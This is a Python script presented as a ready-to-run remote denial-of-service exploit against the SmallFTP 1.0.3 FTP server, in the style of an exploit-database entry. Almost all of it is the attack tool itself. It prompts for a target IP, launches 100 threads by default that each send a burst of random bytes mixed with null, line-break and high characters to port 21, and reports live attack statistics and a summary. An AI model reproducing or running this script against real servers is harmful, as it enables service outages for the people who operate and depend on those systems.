#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║   ███████╗███╗   ███╗ █████╗ ██╗     ██╗     ███████╗████████╗██████╗  ║
║   ██╔════╝████╗ ████║██╔══██╗██║     ██║     ██╔════╝╚══██╔══╝██╔══██╗ ║
║   ███████╗██╔████╔██║███████║██║     ██║     █████╗     ██║   ██████╔╝ ║
║   ╚════██║██║╚██╔╝██║██╔══██║██║     ██║     ██╔══╝     ██║   ██╔═══╝  ║
║   ███████║██║ ╚═╝ ██║██║  ██║███████╗███████╗██║        ██║   ██║      ║
║   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝        ╚═╝   ╚═╝      ║
║                                                                       ║
║               Remote Denial of Service Exploit - v1.0                 ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝

Exploit Title: Remote Denial of Service - SmallFTP 1.0.3
Author: Alchemy (@zar7real)
Date: 22/11/2024
Tested on: Windows 11 Home x64 / Windows 7 Professional x86
Vendor: https://smallftpd.sourceforge.net/
"""

import socket
import threading
import random
import string
import sys
import time
import argparse
from datetime import datetime
import os
import platform

# ANSI Colors
class Colors:
    # Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Background colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    # Styles
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
    # Reset
    RESET = '\033[0m'

    @staticmethod
    def enable_windows_colors():
        if platform.system() == 'Windows':
            os.system('color')
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

# Initialize colors for Windows
Colors.enable_windows_colors()

# Global configuration
config = {
    'target_ip': '127.0.0.1',
    'target_port': 21,
    'threads': 100,
    'delay': 0,
    'verbose': False
}

# Statistics
stats = {
    'start_time': None,
    'total_payloads': 0,
    'successful_connections': 0,
    'failed_connections': 0
}

def clear_screen():
    """Clear terminal screen."""
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_banner():
    """Print an awesome ASCII banner."""
    clear_screen()
    print(f"{Colors.CYAN}")
    print("""
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║   ███████╗███╗   ███╗ █████╗ ██╗     ██╗     ███████╗████████╗██████╗  ║
║   ██╔════╝████╗ ████║██╔══██╗██║     ██║     ██╔════╝╚══██╔══╝██╔══██╗ ║
║   ███████╗██╔████╔██║███████║██║     ██║     █████╗     ██║   ██████╔╝ ║
║   ╚════██║██║╚██╔╝██║██╔══██║██║     ██╔══╝     ██║   ██╔═══╝  ║
║   ███████║██║ ╚═╝ ██║██║  ██║███████╗███████╗██║        ██║   ██║      ║
║   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝        ╚═╝   ╚═╝      ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
    """)
    print(f"{Colors.YELLOW}{Colors.BOLD}       Remote Denial of Service Exploit - SmallFTP 1.0.3{Colors.RESET}")
    print(f"{Colors.GREEN}              Created by: {Colors.BOLD}Alchemy (@zar7real){Colors.RESET}")
    print(f"{Colors.BLUE}              Date: {Colors.BOLD}22/11/2024{Colors.RESET}")
    print("\n")
    
def print_config():
    """Print current configuration."""
    print(f"{Colors.BLUE}╔══════════════════════ {Colors.BOLD}CONFIGURATION{Colors.RESET}{Colors.BLUE} ══════════════════════╗{Colors.RESET}")
    print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Target:{Colors.RESET}           {config['target_ip']}:{config['target_port']}")
    print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Threads:{Colors.RESET}          {config['threads']}")
    print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Delay:{Colors.RESET}            {config['delay']} seconds")
    print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Verbose Mode:{Colors.RESET}     {'Enabled' if config['verbose'] else 'Disabled'}")
    print(f"{Colors.BLUE}╚═════════════════════════════════════════════════════════╝{Colors.RESET}")
    print()

def generate_payload():
    """Generate malicious payload with special characters."""
    special_chars = ["\x00", "\x0a", "\x0d", "\xee", "\xff"]
    random_payload = ''.join(random.choice(special_chars + list(string.ascii_letters)) for _ in range(100))
    return random_payload.encode()

def send_exploit():
    """Send malicious payload to target FTP server."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((config['target_ip'], config['target_port']))
        
        payload = generate_payload()
        s.sendall(payload)
        
        stats['successful_connections'] += 1
        stats['total_payloads'] += 1
        
        if config['verbose']:
            timestamp = datetime.now().strftime("%H:%M:%S")
            hex_payload = payload.hex()
            print(f"{Colors.GREEN}[{timestamp}] [{stats['total_payloads']}] Payload sent successfully {Colors.RESET}")
            print(f"{Colors.CYAN}  └─ HEX: {hex_payload[:50]}...{Colors.RESET}")
            
        s.close()
        
        if config['delay'] > 0:
            time.sleep(config['delay'])
            
    except Exception as e:
        stats['failed_connections'] += 1
        if config['verbose']:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"{Colors.RED}[{timestamp}] Connection failed: {str(e)}{Colors.RESET}")

def show_progress(stop_event):
    """Display attack progress."""
    while not stop_event.is_set():
        if stats['start_time']:
            elapsed = time.time() - stats['start_time']
            success_rate = 0 if stats['total_payloads'] == 0 else (stats['successful_connections'] / stats['total_payloads']) * 100
            
            print(f"\r{Colors.YELLOW}[*] Attack in progress: {Colors.BOLD}{stats['total_payloads']}{Colors.RESET}{Colors.YELLOW} payloads sent | "
                  f"{Colors.GREEN}{stats['successful_connections']}{Colors.RESET}{Colors.YELLOW} successful | "
                  f"{Colors.RED}{stats['failed_connections']}{Colors.RESET}{Colors.YELLOW} failed | "
                  f"Success rate: {Colors.CYAN}{success_rate:.1f}%{Colors.RESET}{Colors.YELLOW} | "
                  f"Time: {Colors.CYAN}{elapsed:.1f}s{Colors.RESET}", end="")
        time.sleep(0.5)
    print("\n")

def start_attack():
    """Start multi-threaded DoS attack."""
    print(f"{Colors.YELLOW}{Colors.BOLD}[!] Starting attack against {config['target_ip']}:{config['target_port']} with {config['threads']} threads{Colors.RESET}\n")
    
    stats['start_time'] = time.time()
    stats['total_payloads'] = 0
    stats['successful_connections'] = 0
    stats['failed_connections'] = 0
    
    progress_stop = threading.Event()
    progress_thread = threading.Thread(target=show_progress, args=(progress_stop,))
    progress_thread.daemon = True
    progress_thread.start()
    
    try:
        thread_list = []
        for _ in range(config['threads']):
            t = threading.Thread(target=send_exploit)
            t.daemon = True
            t.start()
            thread_list.append(t)
            
        for thread in thread_list:
            thread.join()
            
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Attack interrupted by user{Colors.RESET}")
    finally:
        progress_stop.set()
        progress_thread.join()
        
        elapsed = time.time() - stats['start_time']
        
        print(f"{Colors.BLUE}╔══════════════════════ {Colors.BOLD}ATTACK SUMMARY{Colors.RESET}{Colors.BLUE} ══════════════════════╗{Colors.RESET}")
        print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Target:{Colors.RESET}           {config['target_ip']}:{config['target_port']}")
        print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Duration:{Colors.RESET}         {elapsed:.2f} seconds")
        print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Total Payloads:{Colors.RESET}   {stats['total_payloads']}")
        print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Successful:{Colors.RESET}       {stats['successful_connections']}")
        print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Failed:{Colors.RESET}           {stats['failed_connections']}")
        success_rate = 0 if stats['total_payloads'] == 0 else (stats['successful_connections'] / stats['total_payloads']) * 100
        print(f"{Colors.BLUE}║{Colors.RESET} {Colors.YELLOW}Success Rate:{Colors.RESET}     {success_rate:.1f}%")
        print(f"{Colors.BLUE}╚═════════════════════════════════════════════════════════╝{Colors.RESET}")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="SmallFTP Remote DoS Exploit")
    parser.add_argument("-t", "--target", help="Target IP address", required=True)
    parser.add_argument("-p", "--port", type=int, default=21, help="Target port (default: 21)")
    parser.add_argument("-n", "--threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests in seconds (default: 0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()
    
    config['target_ip'] = args.target
    config['target_port'] = args.port
    config['threads'] = args.threads
    config['delay'] = args.delay
    config['verbose'] = args.verbose

def main():
    """Main program execution."""
    try:
        if len(sys.argv) > 1:
            parse_arguments()
        else:
            config['target_ip'] = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
            config['target_port'] = int(input(f"{Colors.YELLOW}[?] Enter target port (default: 21): {Colors.RESET}") or "21")
            config['threads'] = int(input(f"{Colors.YELLOW}[?] Enter number of threads (default: 100): {Colors.RESET}") or "100")
            config['delay'] = float(input(f"{Colors.YELLOW}[?] Enter delay between requests in seconds (default: 0): {Colors.RESET}") or "0")
            config['verbose'] = input(f"{Colors.YELLOW}[?] Enable verbose mode? (y/N): {Colors.RESET}").lower() == 'y'
        
        print_banner()
        print_config()
        
        input(f"{Colors.MAGENTA}[*] Press Enter to start the attack...{Colors.RESET}")
        start_attack()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")

if __name__ == "__main__":
    main()
